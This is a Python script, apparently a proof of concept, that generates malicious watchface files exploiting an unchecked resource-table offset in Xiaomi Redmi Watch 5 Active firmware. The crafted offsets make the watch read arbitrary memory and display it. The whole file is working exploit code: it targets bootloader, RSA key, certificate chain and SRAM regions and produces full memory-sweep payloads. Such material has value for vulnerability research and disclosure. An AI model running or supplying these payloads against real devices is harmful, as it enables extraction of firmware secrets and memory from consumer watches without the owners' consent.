#!/usr/bin/env python3
"""
Xiaomi Redmi Watch 5 Active - OOB Memory Read Exploit (CWE-125)

Watchface resource table offset field is never validated.
Setting the offset to an arbitrary memory address makes the
firmware read that region and render it as pixels on the display.

Usage:
  python3 bin_generator.py
  python3 bin_generator.py --target 0x12000000
  python3 bin_generator.py --range 0x20000000 0x20001000 0x100
"""

import struct
import os
import sys
import hashlib
import argparse

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
REF_WATCHFACE = os.path.join(BASE_DIR, "120917344162_102264556486703.bin")
OUTPUT_DIR = os.path.join(BASE_DIR, "oob_payloads")

MAGIC = bytes([0x5A, 0xA5, 0x34, 0x12])

# Resource table at 0x1C0: [Type 4B][Flags 4B][Offset 4B][Size 4B]
RESOURCE_TABLE_START = 0x1C0
RESOURCE_ENTRY_SIZE  = 16
RESOURCE_OFFSET_POS  = 8
RESOURCE_SIZE_POS    = 12

MEMORY_TARGETS = {
    "flash_fces_header":    {"addr": 0x12000000, "size": 0x1000, "desc": "FCES Header + RSA Public Key"},
    "flash_rsa_key":        {"addr": 0x12000100, "size": 0x200,  "desc": "RSA-2048 Public Key (DER format)"},
    "flash_vector_table":   {"addr": 0x12004000, "size": 0x200,  "desc": "Bootloader Vector Table (SP, Reset)"},
    "flash_bootloader":     {"addr": 0x12004100, "size": 0x1000, "desc": "Bootloader Code"},
    "flash_app_start":      {"addr": 0x12026000, "size": 0x1000, "desc": "app_main.bin Entry Point"},
    "flash_watchface_check":{"addr": 0x120C9A70, "size": 0x100,  "desc": "watchface_ota_header_check"},
    "flash_cert_chain":     {"addr": 0x12E85108, "size": 0x1000, "desc": "DER Certificate Chain"},
    "sram_start":           {"addr": 0x20000000, "size": 0x1000, "desc": "SRAM Start (Global Variables)"},
    "sram_heap":            {"addr": 0x20010000, "size": 0x1000, "desc": "SRAM Heap Area"},
    "sram_ble_state":       {"addr": 0x20020000, "size": 0x1000, "desc": "SRAM Mid (BLE State, Buffers)"},
    "sram_stack":           {"addr": 0x2003E000, "size": 0x1000, "desc": "SRAM Stack Area (Return Addresses)"},
    "ota_state_struct":     {"addr": 0x6039E460, "size": 0x100,  "desc": "OTA State Structure"},
    "watchface_info":       {"addr": 0x603D4620, "size": 0x100,  "desc": "Current Watchface Info"},
    "ble_device_state":     {"addr": 0x6039E4C4, "size": 0x100,  "desc": "BLE Device State"},
}


def load_reference_watchface():
    if not os.path.exists(REF_WATCHFACE):
        print(f"[!] Reference watchface not found: {REF_WATCHFACE}")
        print(f"[*] Creating minimal valid watchface...")
        return create_minimal_watchface()

    with open(REF_WATCHFACE, 'rb') as f:
        data = bytearray(f.read())

    if data[:4] != MAGIC:
        print(f"[!] Invalid magic in reference file")
        return None

    print(f"[+] Loaded reference watchface: {len(data):,} bytes")
    print(f"    ID:   {data[0x28:0x68].split(b'\\x00')[0].decode('ascii', errors='replace')}")
    print(f"    Name: {data[0x68:0xA8].split(b'\\x00')[0].decode('ascii', errors='replace')}")

    print(f"\n    Original resource table:")
    for i in range(8):
        entry_offset = RESOURCE_TABLE_START + (i * RESOURCE_ENTRY_SIZE)
        if entry_offset + 16 > len(data):
            break
        rtype  = struct.unpack_from('<I', data, entry_offset)[0]
        rflags = struct.unpack_from('<I', data, entry_offset + 4)[0]
        roff   = struct.unpack_from('<I', data, entry_offset + 8)[0]
        rsize  = struct.unpack_from('<I', data, entry_offset + 12)[0]
        if roff == 0 and rsize == 0 and rtype == 0:
            break
        in_bounds = "OK" if roff + rsize <= len(data) else "OOB!"
        print(f"    [{i}] type=0x{rtype:08X} off=0x{roff:06X} "
              f"size=0x{rsize:04X} ({rsize:6d}) [{in_bounds}]")

    return data


def create_minimal_watchface():
    wf = bytearray(0x600)
    wf[0:4] = MAGIC
    struct.pack_into('<I', wf, 0x04, 0x00010000)
    struct.pack_into('<I', wf, 0x10, len(wf))
    struct.pack_into('<I', wf, 0x18, 1)

    wf[0x28:0x36] = b"OOB_READ_TEST\x00"
    wf[0x68:0x75] = b"PoC OOB Read\x00"

    struct.pack_into('<I', wf, RESOURCE_TABLE_START, 0x02000001)
    struct.pack_into('<I', wf, RESOURCE_TABLE_START + 4, 0)
    struct.pack_into('<I', wf, RESOURCE_TABLE_START + 8, 0x400)
    struct.pack_into('<I', wf, RESOURCE_TABLE_START + 12, 0x100)

    wf[0x400] = 0x28
    wf[0x401] = 0x03
    wf[0x402] = 0x00
    wf[0x403] = 0x00
    struct.pack_into('<H', wf, 0x404, 32)
    struct.pack_into('<H', wf, 0x406, 32)
    for i in range(0x408, 0x500):
        wf[i] = i & 0xFF

    print(f"[+] Created minimal watchface: {len(wf)} bytes")
    return wf


def craft_oob_payload(base_wf, target_addr, read_size, name_suffix=""):
    payload = bytearray(base_wf)

    entry_offset = RESOURCE_TABLE_START + RESOURCE_OFFSET_POS
    struct.pack_into('<I', payload, entry_offset, target_addr)

    size_offset = RESOURCE_TABLE_START + RESOURCE_SIZE_POS
    struct.pack_into('<I', payload, size_offset, read_size)

    name = f"OOB_{target_addr:08X}\x00"
    name_bytes = name.encode('ascii')[:63]
    payload[0x68:0x68+len(name_bytes)] = name_bytes
    payload[0x68+len(name_bytes)] = 0

    assert payload[:4] == MAGIC, "Magic bytes corrupted!"
    return payload


def craft_multi_region_payload(base_wf, targets):
    payload = bytearray(base_wf)

    for i, (addr, size, desc) in enumerate(targets):
        entry_start = RESOURCE_TABLE_START + (i * RESOURCE_ENTRY_SIZE)
        if entry_start + 16 > len(payload):
            print(f"    [!] Not enough space for entry {i}")
            break

        if i >= 3:
            struct.pack_into('<I', payload, entry_start, 0x03000000 + i)
            struct.pack_into('<I', payload, entry_start + 4, 0)

        struct.pack_into('<I', payload, entry_start + RESOURCE_OFFSET_POS, addr)
        struct.pack_into('<I', payload, entry_start + RESOURCE_SIZE_POS, size)

    name = b"OOB_MULTI_REGION\x00"
    payload[0x68:0x68+len(name)] = name
    return payload


def generate_sweep_payloads(base_wf, start_addr, end_addr, chunk_size):
    payloads = []
    addr = start_addr
    while addr < end_addr:
        read_size = min(chunk_size, end_addr - addr)
        payload = craft_oob_payload(base_wf, addr, read_size)
        payloads.append((addr, read_size, payload))
        addr += chunk_size
    return payloads


def save_payload(payload, filename, output_dir=OUTPUT_DIR):
    os.makedirs(output_dir, exist_ok=True)
    filepath = os.path.join(output_dir, filename)
    with open(filepath, 'wb') as f:
        f.write(payload)
    return filepath, hashlib.md5(payload).hexdigest()


def print_payload_info(filepath, md5, target_addr, read_size, desc):
    size = os.path.getsize(filepath)
    print(f"  [{os.path.basename(filepath)}]")
    print(f"    Target:  0x{target_addr:08X} ({desc})")
    print(f"    Read:    {read_size} bytes (0x{read_size:X})")
    print(f"    Size:    {size:,} bytes")
    print(f"    MD5:     {md5}")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="Xiaomi Redmi Watch 5 Active - OOB Memory Read Exploit Generator"
    )
    parser.add_argument('--target', type=lambda x: int(x, 0),
                       help='Single target address (hex)')
    parser.add_argument('--size', type=lambda x: int(x, 0), default=0x1000,
                       help='Read size (default: 0x1000)')
    parser.add_argument('--range', nargs=3, metavar=('START', 'END', 'CHUNK'),
                       help='Sweep range: START END CHUNK_SIZE (hex)')
    parser.add_argument('--output', default=OUTPUT_DIR,
                       help=f'Output directory (default: {OUTPUT_DIR})')
    args = parser.parse_args()

    print()
    print("=" * 65)
    print("  XIAOMI REDMI WATCH 5 ACTIVE - OOB MEMORY READ EXPLOIT")
    print("  SiFli SF32LB551 | CWE-125 | Out-of-Bounds Read")
    print("=" * 65)

    print("\n[1] Loading reference watchface...")
    base_wf = load_reference_watchface()
    if base_wf is None:
        sys.exit(1)

    OUTPUT_DIR_ACTUAL = args.output
    os.makedirs(OUTPUT_DIR_ACTUAL, exist_ok=True)

    if args.target:
        print(f"\n[2] Crafting single-target payload...")
        payload = craft_oob_payload(base_wf, args.target, args.size)
        fname = f"oob_0x{args.target:08X}.bin"
        fpath, md5 = save_payload(payload, fname, OUTPUT_DIR_ACTUAL)
        print_payload_info(fpath, md5, args.target, args.size, "User-specified")
        print(f"[+] Saved: {fpath}")

    elif args.range:
        start = int(args.range[0], 0)
        end   = int(args.range[1], 0)
        chunk = int(args.range[2], 0)
        print(f"\n[2] Generating sweep payloads...")
        print(f"    Range: 0x{start:08X} - 0x{end:08X}")
        print(f"    Chunk: 0x{chunk:X} bytes")

        payloads = generate_sweep_payloads(base_wf, start, end, chunk)
        print(f"    Total: {len(payloads)} payloads\n")

        for addr, size, payload in payloads:
            fname = f"sweep_0x{addr:08X}.bin"
            fpath, md5 = save_payload(payload, fname, OUTPUT_DIR_ACTUAL)
            print(f"  0x{addr:08X} ({size} bytes) -> {fname} [{md5[:8]}]")

        print(f"\n[+] {len(payloads)} payloads saved to {OUTPUT_DIR_ACTUAL}/")

    else:
        print(f"\n[2] Generating payloads for all memory targets...")
        print(f"    Output: {OUTPUT_DIR_ACTUAL}/\n")

        generated = []
        for target_id, info in MEMORY_TARGETS.items():
            payload = craft_oob_payload(base_wf, info['addr'], info['size'], target_id)
            fname = f"oob_{target_id}.bin"
            fpath, md5 = save_payload(payload, fname, OUTPUT_DIR_ACTUAL)
            print_payload_info(fpath, md5, info['addr'], info['size'], info['desc'])
            generated.append((target_id, info))

        print("\n[3] Generating multi-region payload...")
        multi_targets = [
            (0x12000100, 0x200,  "RSA Public Key"),
            (0x12004000, 0x100,  "Vector Table"),
            (0x20000000, 0x1000, "SRAM Start"),
            (0x2003E000, 0x1000, "SRAM Stack"),
        ]
        multi_payload = craft_multi_region_payload(base_wf, multi_targets)
        fpath, md5 = save_payload(multi_payload, "oob_multi_region.bin", OUTPUT_DIR_ACTUAL)
        print(f"  [oob_multi_region.bin]")
        print(f"    Targets: {len(multi_targets)} regions in single watchface")
        for addr, size, desc in multi_targets:
            print(f"      0x{addr:08X} ({size} bytes) - {desc}")
        print(f"    MD5: {md5}")

        print("\n[4] Generating SRAM sweep payloads...")
        sram_sweep = generate_sweep_payloads(base_wf, 0x20000000, 0x20040000, 0x1000)
        for addr, size, payload in sram_sweep:
            fname = f"sweep_sram_0x{addr:08X}.bin"
            save_payload(payload, fname, OUTPUT_DIR_ACTUAL)
        print(f"    {len(sram_sweep)} payloads (full 256KB SRAM)")

        print("\n[5] Generating Flash header sweep payloads...")
        flash_sweep = generate_sweep_payloads(base_wf, 0x12000000, 0x12030000, 0x1000)
        for addr, size, payload in flash_sweep:
            fname = f"sweep_flash_0x{addr:08X}.bin"
            save_payload(payload, fname, OUTPUT_DIR_ACTUAL)
        print(f"    {len(flash_sweep)} payloads (bootloader + app start)")

        total = len(generated) + 1 + len(sram_sweep) + len(flash_sweep)
        print(f"\n{'=' * 65}")
        print(f"  SUMMARY")
        print(f"{'=' * 65}")
        print(f"  Generated: {total} payload files")
        print(f"  Location:  {OUTPUT_DIR_ACTUAL}/")
        print()
        print(f"  Targets:")
        for tid, info in generated:
            print(f"    0x{info['addr']:08X} {info['desc']}")
        print()


if __name__ == "__main__":
    main()
